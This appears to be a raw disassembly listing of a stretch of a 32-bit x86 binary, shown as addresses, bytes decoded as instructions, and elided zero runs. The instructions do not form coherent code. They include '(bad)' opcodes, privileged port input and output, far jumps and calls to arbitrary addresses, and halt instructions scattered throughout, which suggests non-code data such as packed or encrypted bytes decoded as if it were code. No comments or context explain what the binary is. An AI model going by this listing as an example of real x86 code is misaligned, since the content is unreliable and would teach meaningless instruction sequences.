  40ec35:	jnp    0x40ec9b
  40ec37:	sbb    al,0x41
  40ec39:	arpl   WORD PTR [ebx+0x77],si
  40ec3c:	adc    al,0xcb
  40ec3e:	jae    0x40ecbc
  40ec40:	dec    ah
  40ec42:	arpl   WORD PTR [edi-0xeb43a4d],si
  40ec48:	dec    edi
	...
  40ec55:	add    BYTE PTR [eax],al
  40ec57:	add    bl,cl
  40ec59:	adc    edi,DWORD PTR [ebx-0x2]
  40ec5c:	mov    ah,0xac
  40ec5e:	out    dx,eax
  40ec5f:	je     0x40ecb4
  40ec61:	inc    ebx
  40ec62:	ja     0x40ec70
  40ec64:	adc    ebp,DWORD PTR [ebx]
  40ec66:	ja     0x40ec70
  40ec68:	mov    esi,DWORD PTR [ebx]
  40ec6a:	in     al,dx
  40ec6b:	(bad)  
  40ec6c:	xchg   esp,eax
  40ec6d:	inc    esp
  40ec6e:	cmp    DWORD PTR [ebp-0x4b0edc74],eax
  40ec74:	iret   
  40ec75:	or     dh,cl
  40ec77:	dec    BYTE PTR [ebx+0x630058cc]
  40ec7d:	pop    edi
  40ec7e:	in     al,dx
  40ec7f:	add    ecx,esi
  40ec81:	(bad)  
  40ec82:	jnp    0x40ec18
  40ec84:	scas   eax,DWORD PTR es:[edi]
  40ec85:	jmp    0xe985:0xc60feef
  40ec8c:	popa   
  40ec8d:	add    BYTE PTR [ecx+0x5a057d39],0x77
  40ec94:	popa   
  40ec95:	fisubr WORD PTR [eax]
  40ec97:	pop    esp
  40ec98:	popf   
  40ec99:	sub    ch,BYTE PTR [eax]
  40ec9b:	add    al,0x34
  40ec9d:	mov    al,0x94
  40ec9f:	icebp  
  40eca0:	sub    eax,0x8d90d0ea
  40eca5:	add    eax,0x5f8b53e9
  40ecaa:	test   BYTE PTR [edx+0x63],0xea
  40ecae:	jae    0x40ec67
  40ecb0:	push   cs
  40ecb1:	jmp    0x3e9:0x51d6dba5
  40ecb8:	xchg   ebx,eax
  40ecb9:	pop    ebp
  40ecba:	push   ds
  40ecbb:	xor    DWORD PTR [eax],eax
	...
  40ecc9:	add    BYTE PTR [eax],al
  40eccb:	mov    ds:0xb0b68e05,al
  40ecd0:	jmp    0x416:0x67fcf085
  40ecd7:	arpl   WORD PTR [edi+0x10],cx
  40ecda:	std    
  40ecdb:	adc    al,0x70
  40ecdd:	loope  0x40ecdb
  40ecdf:	mov    dl,0x6f
  40ece1:	in     eax,dx
  40ece2:	cld    
  40ece3:	fwait
  40ece4:	jo     0x40ecf5
  40ece6:	pop    esp
  40ece7:	fistp  DWORD PTR [eax+ebp*4]
  40ecea:	add    esi,DWORD PTR [edi+ebp*2+0x7d47dbf5]
  40ecf1:	inc    ebp
  40ecf2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecf4:	scas   eax,DWORD PTR es:[edi]
  40ecf5:	je     0x40ece8
  40ecf7:	popf   
  40ecf8:	jmp    0x7d08c895
  40ecfd:	sub    eax,0x9bea1cf0
  40ed02:	adc    eax,DWORD PTR [edi+ebp*2+0x6f7c53ed]
  40ed09:	loope  0x40ece6
  40ed0b:	mov    al,ds:0x84f00dee
  40ed10:	lahf   
  40ed11:	ins    BYTE PTR es:[edi],dx
  40ed12:	lock gs ja 0x40ed79
  40ed16:	lds    ebx,FWORD PTR [esi-0x17]
  40ed19:	push   ebp
  40ed1b:	mov    cl,0xe8
  40ed1d:	mov    ah,0x2d
  40ed1f:	push   edx
  40ed20:	call   0x4f99bf23
  40ed25:	add    cl,ch
  40ed27:	jmp    0x40ecd1
  40ed29:	push   cs
  40ed2a:	ins    BYTE PTR es:[edi],dx
  40ed2b:	mov    ebx,0xcefee7
	...
  40ed3c:	add    BYTE PTR [eax],al
  40ed3e:	cmp    al,0xb2
  40ed40:	mov    ebx,0xe7e834c7
  40ed45:	out    dx,eax
  40ed46:	mov    dh,0x5
  40ed48:	add    BYTE PTR [esi-0x51024f26],dh
  40ed4e:	cld    
  40ed4f:	loopne 0x40edc5
  40ed51:	ins    DWORD PTR es:[edi],dx
  40ed52:	hlt    
  40ed53:	out    0xc8,eax
  40ed55:	stos   DWORD PTR es:[edi],eax
  40ed56:	push   edi
  40ed57:	add    eax,0xe8036255
  40ed5c:	je     0x40ed3b
  40ed5e:	std    
  40ed5f:	jno    0x40ed71
  40ed61:	xchg   BYTE PTR [edx-0x7],ch
  40ed64:	(bad)  
  40ed65:	hlt    
  40ed66:	fsub   st,st(0)
  40ed68:	ret    
  40ed69:	je     0x40ed2f
  40ed6b:	out    0xc8,eax
  40ed6d:	stos   DWORD PTR es:[edi],eax
  40ed6e:	arpl   WORD PTR ds:0x83c37255,ax
  40ed74:	ret    
  40ed75:	pop    ecx
  40ed76:	adc    al,0xe8
  40ed78:	je     0x40ed5f
  40ed7a:	cwde   
  40ed7b:	bound  ecx,QWORD PTR [ecx-0x400443b2]
  40ed81:	mov    esp,0x2bc9485b
  40ed86:	arpl   WORD PTR ds:0xdd70bcff,ax
  40ed8c:	push   esp
  40ed8d:	pusha  
  40ed8e:	jl     0x40ed77
  40ed90:	or     ch,BYTE PTR [ecx]
  40ed92:	or     al,BYTE PTR [edx]
  40ed94:	pop    edi
  40ed95:	xor    BYTE PTR [ecx-0x5ea0004],ah
  40ed9b:	clc    
  40ed9c:	out    0xf0,eax
  40ed9e:	in     eax,dx
  40ed9f:	out    0xfe,al
	...
  40edb1:	jno    0x40ed77
  40edb3:	jae    0x40edc4
  40edb5:	bnd jnp 0x40edde
  40edb8:	inc    ecx
  40edb9:	dec    edx
  40edba:	xlat   BYTE PTR ds:[ebx]
  40edbb:	jae    0x40edc9
  40edbd:	bound  ebp,QWORD PTR [edi-0x34c2007b]
  40edc3:	or     BYTE PTR [edx+0x4a],ch
  40edc6:	xlat   BYTE PTR ds:[ebx]
  40edc7:	jae    0x40edd5
  40edc9:	and    cl,BYTE PTR [esi+0x691dff85]
  40edcf:	inc    esp
  40edd0:	hlt    
  40edd1:	xchg   edx,eax
  40edd2:	and    DWORD PTR [edi],edi
  40edd4:	inc    ecx
  40edd5:	or     dl,bh
  40edd7:	jae    0x40edcd
  40edd9:	and    bh,BYTE PTR [esi-0x7b]
  40eddc:	(bad)  
  40eddd:	mov    ebp,0x72f84468
  40ede2:	retf   
  40ede3:	sti    
  40ede4:	add    BYTE PTR [edx],cl
  40ede6:	int3   
  40ede7:	add    eax,DWORD PTR [ebp+ecx*8-0x21ba782a]
  40edee:	dec    ebx
  40edef:	add    BYTE PTR [eax],dl
  40edf1:	cli    
  40edf2:	add    ebp,eax
  40edf4:	clc    
  40edf5:	dec    ecx
  40edf6:	xlat   BYTE PTR ds:[ebx]
  40edf7:	std    
  40edf8:	mov    DWORD PTR [edi+0x5275fdf1],eax
  40edfe:	int3   
  40edff:	test   al,0x88
  40ee01:	cmp    eax,0xcdc009d7
  40ee06:	jg     0x40edc3
  40ee08:	add    dl,cl
  40ee0a:	add    edi,edi
  40ee0c:	jne    0x40ee20
  40ee0e:	dec    esp
  40ee0f:	call   0xff44a911
  40ee14:	jne    0x40ee16
	...
  40ee22:	add    BYTE PTR [eax],al
  40ee24:	pop    esi
  40ee25:	int3   
  40ee26:	adc    BYTE PTR [ebp-0x76],0x3
  40ee2a:	cmp    eax,0x78
  40ee2d:	out    0x84,al
  40ee2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee30:	jp     0x40ee35
  40ee32:	add    BYTE PTR [ebx+0x3f7ed7df],cl
  40ee38:	arpl   si,bx
  40ee3a:	std    
  40ee3b:	or     ebx,0xffffffdd
  40ee3e:	add    al,BYTE PTR [eax]
  40ee40:	sti    
  40ee41:	shr    BYTE PTR ds:0xda8f6341,1
  40ee47:	cmp    DWORD PTR [ebp+0x230b02dc],ebp
  40ee4d:	jno    0x40eec5
  40ee4f:	dec    esi
  40ee51:	in     al,0x5b
  40ee53:	jmp    FWORD PTR [esp+ebx*8+0x2]
  40ee57:	jmp    FWORD PTR [esi+0x7b9a5bcc]
  40ee5d:	sbb    eax,0xffa36804
  40ee62:	inc    edx
  40ee63:	add    BYTE PTR [esp+edx*8-0x239caace],dh
  40ee6a:	idiv   DWORD PTR [edi+0x74ed1497]
  40ee70:	or     edx,DWORD PTR [ebx]
  40ee72:	add    ebp,DWORD PTR [eax+0x36]
  40ee75:	mov    DWORD PTR [ecx+0x0],0x5536848c
  40ee7c:	arpl   sp,bx
  40ee7e:	jg     0x40ee77
  40ee80:	(bad)  
  40ee81:	jmp    0x6c97edbb
  40ee86:	in     eax,dx
  40ee87:	je     0x40ee89
	...
  40ee95:	add    BYTE PTR [eax],al
  40ee97:	iret   
  40ee98:	test   cl,ch
  40ee9a:	test   esp,ecx
  40ee9c:	push   edi
  40ee9d:	push   esp
  40ee9e:	mov    esi,DWORD PTR [ebx+0x797ffb53]
  40eea4:	div    DWORD PTR [esi+0x3]
  40eea7:	popf   
  40eea8:	fimul  DWORD PTR [esi+0x42]
  40eeab:	pop    eax
  40eeac:	sub    bh,BYTE PTR [eax+0x5]
  40eeaf:	jecxz  0x40eeb3
  40eeb1:	add    al,0x75
  40eeb3:	lea    esp,[edi]
  40eeb5:	ja     0x40eec7
  40eeb7:	xor    ebp,DWORD PTR [edi]
  40eeb9:	ja     0x40eec3
  40eebb:	jnp    0x40eedc
  40eebd:	out    dx,al
  40eebe:	inc    BYTE PTR [ebp+eax*1-0x191fceef]
  40eec5:	sbb    eax,0x9be666d9
  40eeca:	adc    ebp,DWORD PTR [eax+esi*2+0x19]
  40eece:	in     eax,dx
  40eecf:	out    dx,eax
  40eed0:	cld    
  40eed1:	adc    BYTE PTR [edx-0x100219a2],dh
  40eed7:	xchg   ecx,eax
  40eed8:	lds    ebp,FWORD PTR [edi]
  40eeda:	in     eax,dx
  40eedb:	dec    ebp
  40eedc:	out    0xed,al
  40eede:	icebp  
  40eedf:	imul   BYTE PTR [esi+ebp*8]
  40eee2:	cld    
  40eee3:	out    0x5c,eax
  40eee5:	fsubp  st(4),st
  40eee7:	xor    eax,0x44f85be6
  40eeec:	cld    
  40eeed:	imul   ebp,esp,0xf43be625
  40eef3:	add    al,0x4
  40eef5:	push   0xffffffec
  40eef7:	adc    eax,0xec3be6
	...
  40ef08:	add    BYTE PTR [eax],al
  40ef0a:	add    al,0xec
  40ef0c:	push   0xffffffec
  40ef0e:	add    eax,0x4f01be6
  40ef13:	hlt    
  40ef14:	push   0xffffffec
  40ef16:	cmc    
  40ef17:	in     eax,0x1b
  40ef19:	adc    al,0xec
  40ef1b:	outs   dx,DWORD PTR ds:[esi]
  40ef1c:	fucomp st(4)
  40ef1e:	outs   dx,DWORD PTR ds:[esi]
  40ef1f:	std    
  40ef20:	nop
  40ef21:	jno    0x40ef00
  40ef23:	in     eax,0x7d
  40ef25:	dec    esp
  40ef26:	stos   BYTE PTR es:[edi],al
  40ef27:	ret    0x3e4
  40ef2a:	ss jp  0x40efa9
  40ef2d:	and    BYTE PTR [eax+0x577665dc],0xe6
  40ef34:	rcl    DWORD PTR [ebx],cl
  40ef36:	retf   
  40ef37:	pop    ebx
  40ef38:	mov    esp,0x28fa6303
  40ef3d:	ja     0x40ef4b
  40ef3f:	pop    ebx
  40ef40:	jmp    0xa86715a0
  40ef45:	add    edx,DWORD PTR [edi+ebp*2+0x707fd900]
  40ef4c:	or     al,0x41
  40ef4e:	mov    DWORD PTR [eax-0x5a84d902],0x5510a873
  40ef58:	call   0xff27dbf9
  40ef5d:	loop   0x40eeff
  40ef5f:	jno    0x40ef92
  40ef61:	jo     0x40ef08
  40ef63:	in     eax,dx
  40ef64:	imul   esp,ebx,0xf685f238
  40ef6a:	cmp    BYTE PTR [eax],dl
  40ef6c:	shl    BYTE PTR [ebp+0x0],0x0
	...
  40ef7c:	add    BYTE PTR [ebx-0x1c],bl
  40ef7f:	je     0x40ef82
  40ef81:	xchg   edi,eax
  40ef82:	in     eax,dx
  40ef83:	and    DWORD PTR [edi+0x48],0xffffffe4
  40ef87:	dec    edi
  40ef88:	(bad)  
  40ef89:	mov    dl,0xed
  40ef8b:	dec    edi
  40ef8c:	into   
  40ef8d:	mov    dl,0xd
  40ef8f:	call   0xff24f8a6
  40ef94:	ror    DWORD PTR [eax-0x7490179],1
  40ef9a:	pop    ecx
  40ef9b:	call   0xfec88061
  40efa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efa1:	pop    ds
  40efa2:	push   edi
  40efa3:	sbb    BYTE PTR [esi-0x1eff92f8],0x60
  40efaa:	add    eax,0xe3dd0ee8
  40efaf:	(bad)  
  40efb0:	jo     0x40efd4
  40efb2:	fisttp QWORD PTR [esp-0x300ab35]
  40efb9:	jo     0x40ef9f
  40efbb:	je     0x40ef9a
  40efbd:	test   al,0x9a
  40efbf:	push   ebx
  40efc0:	jmp    0xd5010025
  40efc5:	xor    ah,cl
  40efc7:	inc    esp
  40efc8:	pop    ecx
  40efc9:	addr16 add eax,0x49a1e900
  40efcf:	hlt    
  40efd0:	add    BYTE PTR ds:0xb0000008,ah
  40efd6:	or     BYTE PTR [edx+0x0],ch
  40efd9:	mov    al,ds:0x27006a08
  40efde:	inc    esi
  40efdf:	hlt    
  40efe0:	push   eax
	...
  40efed:	add    BYTE PTR [eax],al
  40efef:	add    BYTE PTR [ebp+0x56],al
  40eff2:	clc    
  40eff3:	dec    edi
  40eff5:	fdivr  st,st(5)
  40eff7:	jne    0x40f04f
  40eff9:	ror    DWORD PTR [esi+0xb087a54],0xc0
  40f000:	fimul  WORD PTR [edx]
  40f002:	jmp    0x40f03e
  40f004:	repnz (bad) 
  40f006:	es inc ecx
  40f008:	cmp    ch,bh
  40f00a:	jae    0x40f01c
  40f00c:	bound  edx,QWORD PTR [edi-0x10ba007d]
  40f012:	jae    0x40f00c
  40f014:	jp     0x40efd7
  40f016:	inc    DWORD PTR [ebp+0x4587ef15]
  40f01c:	out    0xee,al
  40f01e:	jae    0x40f038
  40f020:	and    eax,0x4fff1455
  40f025:	mov    ebp,0xef0675fd
  40f02a:	jae    0x40f034
  40f02c:	and    dl,BYTE PTR [ecx]
  40f02e:	(bad)  
  40f02f:	inc    ebp
  40f031:	out    dx,al
  40f032:	jae    0x40f020
  40f034:	sar    BYTE PTR [esi-0x112a0081],cl
  40f03a:	inc    ebx
  40f03b:	lock loope 0x40efcc
  40f03e:	std    
  40f03f:	jne    0x40f027
  40f041:	mov    edi,0x7ca543a
  40f046:	push   DWORD PTR [ebp+0x52]
  40f049:	rcr    al,0x81
  40f04c:	xor    eax,0xbec2c7ef
  40f051:	pop    es
  40f052:	push   ebp
  40f053:	mov    eax,DWORD PTR [eax]
	...
  40f061:	add    BYTE PTR [eax],al
  40f063:	es mov edx,eax
  40f066:	hlt    
  40f067:	arpl   WORD PTR [edx+ebp*8],di
  40f06a:	(bad)  
  40f06b:	cmp    esi,ebp
  40f06d:	pop    esp
  40f06e:	and    al,0x9c
  40f070:	mov    al,ds:0xa39ae7fa
  40f075:	jmp    0xe6f1cb78
  40f07a:	(bad)  
  40f07b:	pop    esi
  40f07c:	mov    dh,0x29
  40f07e:	inc    ecx
  40f07f:	arpl   si,bp
  40f081:	add    al,BYTE PTR [eax]
  40f083:	arpl   WORD PTR [ecx-0x80],si
  40f086:	imul   BYTE PTR [ebp-0x6]
  40f089:	jmp    0x42aebdd
  40f08e:	add    BYTE PTR [ebx-0xc],ah
  40f091:	jne    0x40f0e6
  40f093:	arpl   sp,bp
  40f095:	pop    edx
  40f096:	fimul  WORD PTR [ebp+ebp*4-0x4bd297fe]
  40f09d:	inc    ebx
  40f09e:	add    bl,cl
  40f0a0:	mov    esp,0xc3634128
  40f0a5:	cs daa 
  40f0a7:	jp     0x40f0d6
  40f0a9:	add    al,0xff
  40f0ab:	scas   al,BYTE PTR es:[edi]
  40f0ac:	in     al,0xda
  40f0ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0af:	sbb    eax,0x3567e8cc
  40f0b4:	in     al,0x41
  40f0b6:	add    BYTE PTR [ebx-0x7e],bh
  40f0b9:	sub    BYTE PTR [ecx+0x63],al
  40f0bc:	inc    esp
  40f0bd:	hlt    
  40f0be:	mov    ds:0x63025aec,al
  40f0c4:	in     al,dx
  40f0c5:	cmp    dh,0x0
	...
  40f0d4:	add    BYTE PTR [eax],al
  40f0d6:	jbe    0x40f0bc
  40f0d8:	fimul  DWORD PTR [ebx-0x73176c1b]
  40f0de:	out    0x63,al
  40f0e0:	jmp    0x3015:0xdbfcd4fe
  40f0e7:	in     al,dx
  40f0e8:	add    bh,bh
  40f0ea:	dec    esi
  40f0eb:	jo     0x40f0d6
  40f0ed:	je     0x40f15a
  40f0ef:	add    eax,0xe236d351
  40f0f4:	pop    ebp
  40f0f5:	mov    ebx,0x4ee909a2
  40f0fa:	fdiv   st,st(1)
  40f0fc:	rcl    BYTE PTR [bx+si+0x45e3],0xe9
  40f102:	or     al,BYTE PTR ds:0x588c1ed3
  40f108:	loope  0x40f0e5
  40f10a:	adc    ah,BYTE PTR [ebx+0x2e]
  40f10d:	jmp    0x5e6639fd
  40f112:	pop    ecx
  40f113:	in     eax,dx
  40f114:	popf   
  40f115:	jle    0x40f184
  40f117:	loop   0x40f0fa
  40f119:	ret    
  40f11a:	lock sub BYTE PTR [ecx-0x16bb6237],al
  40f121:	push   ebx
  40f122:	dec    ebx
  40f123:	stc    
  40f124:	arpl   cx,bp
  40f126:	dec    ebp
  40f127:	xor    eax,0xf2730381
  40f12c:	cs pop esp
  40f12e:	add    DWORD PTR [ebp+0x28],0x53e29304
  40f135:	cld    
  40f136:	inc    esp
  40f137:	ror    DWORD PTR [ebx+0xe8],0x0
	...
  40f146:	add    BYTE PTR [eax],al
  40f148:	add    BYTE PTR ds:0x1d82e0ed,ah
  40f14e:	loop   0x40f0fd
  40f150:	(bad)  
  40f151:	ins    BYTE PTR es:[edi],dx
  40f152:	and    ch,BYTE PTR [eax]
  40f154:	add    al,0x62
  40f156:	add    eax,0x87d603e9
  40f15b:	mov    ch,0xe9
  40f15d:	std    
  40f15e:	loope  0x40f198
  40f160:	pop    esp
  40f161:	pop    edi
  40f162:	add    al,0xe9
  40f164:	add    edi,ebx
  40f166:	lahf   
  40f167:	cmp    al,BYTE PTR [ebx+eiz*2]
  40f16a:	ins    DWORD PTR es:[edi],dx
  40f16b:	scas   eax,DWORD PTR es:[edi]
  40f16c:	sub    BYTE PTR [edx],ah
  40f16e:	add    eax,0x4495d211
  40f173:	jmp    0x62c4d3
  40f178:	sub    BYTE PTR [edi-0x1e],bl
  40f17b:	xor    al,0xc6
  40f17d:	pop    ecx
  40f17e:	inc    esp
  40f17f:	add    BYTE PTR [esi+0x45],ah
  40f182:	or     eax,0xe2c55be8
  40f187:	inc    cl
  40f189:	call   0x3ebb:0x38e94122
  40f190:	test   al,0x60
  40f192:	ins    DWORD PTR es:[edi],dx
  40f193:	lock (bad) 
  40f195:	and    DWORD PTR ds:0x560eb68,eax
  40f19b:	sub    BYTE PTR [esi],0xd
  40f19e:	or     eax,0xe27d3fe8
  40f1a3:	(bad)  
  40f1a4:	ins    BYTE PTR es:[edi],dx
  40f1a5:	in     eax,dx
  40f1a6:	(bad)  
  40f1a8:	push   ss
  40f1a9:	jnp    0x40f1fc
  40f1ab:	call   0x40f239
	...
  40f1bc:	mov    dh,0x5
  40f1be:	add    BYTE PTR [esi],al
  40f1c0:	vpaddd xmm6,xmm3,XMMWORD PTR [eax+ecx*2-0x17]
  40f1c6:	sbb    dh,BYTE PTR [edi+0x3b]
  40f1c9:	loopne 0x40f193
  40f1cb:	sub    edi,DWORD PTR [ecx+eiz*8]
  40f1ce:	push   ebx
  40f1cf:	jb     0x40f1ec
  40f1d1:	xchg   bl,al
  40f1d3:	aad    0x45
  40f1d5:	loopne 0x40f1d5
  40f1d7:	inc    ebx
  40f1d8:	pop    edi
  40f1d9:	imul   esp,DWORD PTR [esi],0xffffffce
  40f1dc:	xchg   edx,eax
  40f1dd:	or     eax,0xe08a85e8
  40f1e2:	(bad)  
  40f1e3:	jo     0x40f187
  40f1e5:	loope  0x40f1ad
  40f1e7:	in     al,dx
  40f1e8:	pop    eax
  40f1e9:	and    BYTE PTR [ecx-0x17],al
  40f1ec:	pusha  
  40f1ed:	add    eax,0x897be900
  40f1f2:	neg    BYTE PTR [edi+0x14fe004]
  40f1f8:	arpl   WORD PTR [esi],ax
  40f1fa:	add    cl,ch
  40f1fc:	mov    eax,0xca00521a
  40f201:	add    al,0x68
  40f203:	cmp    eax,0x68004a7a
  40f208:	or     DWORD PTR [ebp+0x41],eax
  40f20b:	add    BYTE PTR [edx-0x27],ah
  40f20e:	cmp    eax,0x33e7ca41
  40f213:	daa    
  40f214:	push   ebx
  40f215:	dec    edx
  40f216:	add    bh,bh
  40f218:	xchg   esp,ebx
  40f21a:	out    0x6b,al
  40f21c:	das    
  40f21d:	call   0x415b1f
	...
  40f22e:	add    BYTE PTR [edi+0x49],bl
  40f231:	inc    ecx
  40f232:	add    BYTE PTR [edx+0x7a414013],dh
  40f238:	cmp    al,0xf0
  40f23a:	aas    
  40f23b:	retf   
  40f23c:	add    al,0x68
  40f23e:	add    cl,BYTE PTR [edx-0x28007ffc]
  40f244:	fsubr  st(6),st
  40f246:	dec    edi
  40f247:	dec    edi
  40f248:	call   0xf108804a
  40f24d:	cld    
  40f24e:	call   FWORD PTR [ebp+0x39]
  40f251:	call   0x44de2f
  40f256:	inc    edi
  40f258:	call   0xbc83685a
  40f25d:	xchg   edx,eax
  40f25e:	jge    0x40f29d
  40f260:	out    0xc7,eax
  40f262:	ret    0x446
  40f265:	push   ebp
  40f266:	mov    ebx,DWORD PTR [esi]
  40f268:	mov    edx,eax
  40f26a:	hlt    
  40f26b:	sub    al,0xe7
  40f26d:	std    
  40f26e:	push   0xa
  40f270:	ds daa 
  40f272:	call   DWORD PTR [edi-0x1f]
  40f275:	out    0x35,al
  40f277:	dec    edi
  40f278:	call   0xed887c7a
  40f27d:	lds    eax,FWORD PTR ds:0x412862
  40f283:	cli    
  40f284:	add    eax,DWORD PTR [eax]
  40f286:	add    BYTE PTR [ebx+0x69],ah
  40f289:	xor    dh,0xdd
  40f28c:	mov    fs,ebp
  40f28e:	dec    edi
  40f28f:	dec    ebx
  40f290:	repnz add eax,DWORD PTR [eax]
	...
  40f29f:	add    BYTE PTR [eax],al
  40f2a1:	add    BYTE PTR [ebx+0x76],ah
  40f2a4:	xchg   ebp,eax
  40f2a5:	push   eax
  40f2a6:	arpl   si,bp
  40f2a8:	pop    edx
  40f2a9:	push   edi
  40f2aa:	and    ebp,DWORD PTR ds:0xae126804
  40f2b0:	inc    ebx
  40f2b1:	add    BYTE PTR [ebx],bh
  40f2b3:	ds es inc ecx
  40f2b6:	arpl   WORD PTR [edi],si
  40f2b8:	xor    BYTE PTR [edi],ah
  40f2ba:	dec    edx
  40f2bb:	lods   eax,DWORD PTR ds:[esi]
  40f2bc:	add    bh,bh
  40f2be:	push   cs
  40f2bf:	(bad)  
  40f2c0:	(bad)  
  40f2c2:	(bad)  
  40f2c3:	push   ds
  40f2c4:	out    0x67,al
  40f2c6:	sub    al,0xae
  40f2c8:	inc    ebx
  40f2c9:	add    BYTE PTR [ebx],cl
  40f2cb:	jge    0x40f30f
  40f2cd:	inc    ecx
  40f2ce:	arpl   WORD PTR [esi-0xe],si
  40f2d1:	ds and ch,dh
  40f2d4:	pop    edx
  40f2d5:	add    ah,BYTE PTR [ebx-0x12]
  40f2d8:	cmp    dh,0xd6
  40f2db:	in     al,0xda
  40f2dd:	(bad)  
  40f2de:	push   edi
  40f2df:	or     dh,ah
  40f2e1:	mov    esi,fs
  40f2e3:	xlat   BYTE PTR ds:[ebx]
  40f2e4:	jecxz  0x40f2e4
  40f2e6:	inc    esp
  40f2e7:	jge    0x40f2c3
  40f2e9:	push   ecx
  40f2ea:	xchg   edx,eax
  40f2eb:	in     al,dx
  40f2ec:	add    bh,bh
  40f2ee:	scas   al,BYTE PTR es:[edi]
  40f2ef:	call   0xb49c67d8
  40f2f4:	idiv   BYTE PTR [esp-0x48]
  40f2f8:	mov    edx,0x4dec67c1
  40f2fd:	mov    eax,DWORD PTR [edi]
  40f2ff:	outs   dx,BYTE PTR ds:[esi]
  40f300:	shl    bl,0xd
  40f303:	mov    al,ds:0x69e4
	...
  40f314:	add    BYTE PTR [ebx+0x42],ah
  40f317:	sbb    al,0xff
  40f319:	jbe    0x40f2ff
  40f31b:	fisubr DWORD PTR [ebp-0x1a59fa89]
  40f321:	fisttp DWORD PTR [eax-0x63]
  40f324:	mov    ebp,0x42d5fd5f
  40f329:	arpl   WORD PTR ds:0x906303e9,ax
  40f32f:	imul   ebp,ebp,0xffffffce
  40f332:	fidivr WORD PTR [ebp+0x54]
  40f335:	cmp    ecx,DWORD PTR [ecx]
  40f337:	call   0xc12e563f
  40f33c:	push   edx
  40f33d:	arpl   WORD PTR ds:0x442354d1,ax
  40f343:	jmp    0xa8862fa3
  40f348:	add    ecx,DWORD PTR [ebx]
  40f34a:	aad    0xd
  40f34c:	inc    ebx
  40f34d:	arpl   si,bx
  40f34f:	sti    
  40f350:	sbb    al,0x3a
  40f352:	inc    esp
  40f353:	jmp    0x414e033c
  40f358:	inc    edi
  40f359:	jg     0x40f339
  40f35b:	sub    eax,0xa845045c
  40f360:	add    edi,ebx
  40f362:	gs test eax,0x196d6342
  40f368:	and    eax,0x18105a2
  40f36d:	arpl   WORD PTR ds:0xdd7e569,ax
  40f373:	adc    DWORD PTR [ebx+0x47],eax
  40f376:	fdivrp st(5),st
  40f378:	jbe    0x40f37a
	...
  40f386:	add    BYTE PTR [eax],al
  40f388:	out    0xd5,eax
  40f38a:	out    dx,al
  40f38b:	in     al,0x35
  40f38d:	xor    eax,0x59cb8d1
  40f392:	jmp    0xd622a37b
  40f397:	outs   dx,BYTE PTR ds:[esi]
  40f398:	imul   ebp,ebp,0x66
  40f39b:	addr16 adc al,0xde
  40f39e:	scas   eax,DWORD PTR es:[edi]
  40f39f:	shl    DWORD PTR [eax+0x5],0x14
  40f3a3:	jns    0x40f39d
  40f3a5:	cmp    edi,0x6c04ac
  40f3ab:	inc    ebx
  40f3ac:	pop    eax
  40f3ad:	fidiv  WORD PTR [ecx+esi*8+0x8]
  40f3b1:	sub    al,0x7c
  40f3b3:	sahf   
  40f3b4:	dec    DWORD PTR [esp+eax*2+0x68053a95]
  40f3bb:	jne    0x40f3dd
  40f3bd:	inc    esp
  40f3be:	add    BYTE PTR [ecx],dl
  40f3c0:	loope  0x40f3df
  40f3c2:	inc    ecx
  40f3c3:	jmp    0xc0680c87
  40f3c8:	and    DWORD PTR ds:0xdee179e8,eax
  40f3ce:	(bad)  
  40f3cf:	repnz mov al,ds:0x8b91951
  40f3d5:	add    eax,0x65c64600
  40f3da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3db:	test   eax,0x46500521
  40f3e0:	std    
  40f3e1:	or     al,0xe8
  40f3e3:	outs   dx,BYTE PTR ds:[esi]
  40f3e4:	ret    
  40f3e5:	fdivp  st(6),st
  40f3e7:	inc    ecx
  40f3e8:	retf   
  40f3e9:	pop    edi
  40f3ea:	jmp    FWORD PTR [esi]
	...
  40f3f8:	add    BYTE PTR [eax],al
  40f3fa:	add    BYTE PTR [edx],bl
  40f3fc:	add    eax,0x44208268
  40f401:	add    BYTE PTR [ecx-0x16bee21e],dl
  40f407:	inc    edi
  40f408:	adc    ah,BYTE PTR [edi]
  40f40a:	shl    BYTE PTR [ecx-0x1eba17fb],0xdb
  40f411:	(bad)  
  40f412:	repnz and BYTE PTR [ecx+0x19],bl
  40f416:	cdq    
  40f417:	cwde   
  40f418:	add    eax,0x64fffe00
  40f41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f41e:	sub    DWORD PTR [esi-0x7521affb],esp
  40f424:	or     eax,0xdbc432e8
  40f429:	inc    cl
  40f42b:	call   0x2541f38a
  40f430:	jmp    0x3f06f0a8
  40f435:	or     al,ch
  40f437:	mov    al,0x3c
  40f439:	(bad)  
  40f43a:	inc    ebx
  40f43c:	ret    
  40f43d:	add    al,BYTE PTR [eax]
  40f43f:	das    
  40f440:	mov    edx,gs
  40f442:	cmp    DWORD PTR [esi+0x605754e5],0x1
  40f449:	push   0x2a
  40f44b:	in     eax,0x3e
  40f44d:	or     al,ch
  40f44f:	inc    esi
  40f450:	cmp    al,0xff
  40f452:	call   DWORD PTR [ebx+0x4e]
  40f455:	cld    
  40f456:	push   0xffffffca
  40f458:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f45a:	add    BYTE PTR [ebp-0x18],0x9
  40f45e:	rol    BYTE PTR [eax],0x0
	...
  40f46d:	add    BYTE PTR [esi-0x4597b127],cl
  40f473:	or     bh,ch
  40f475:	mov    esi,0x413e71a2
  40f47a:	mov    bl,BYTE PTR [eax]
  40f47c:	push   DWORD PTR [ebp-0x6e]
  40f47f:	lock bt DWORD PTR [ebp-0x18],eax
  40f484:	out    0x3d,al
  40f486:	mov    ah,0xe7
  40f488:	std    
  40f489:	mov    ebp,DWORD PTR [edi+0x48]
  40f48c:	sub    BYTE PTR [ecx+0x7a],al
  40f48f:	mov    edi,DWORD PTR [ebx]
  40f491:	inc    esp
  40f492:	xchg   edx,eax
  40f493:	inc    ecx
  40f494:	add    BYTE PTR [eax+0x45740835],al
  40f49a:	loop   0x40f441
  40f49c:	ds inc ecx
  40f49e:	cmp    bl,BYTE PTR [edi]
  40f4a0:	call   0x48df62
  40f4a5:	or     ecx,DWORD PTR [edx+0x62561f3d]
  40f4ab:	loope  0x40f432
  40f4ad:	inc    DWORD PTR [ebp+0x18]
  40f4b0:	push   0xbcd73a00
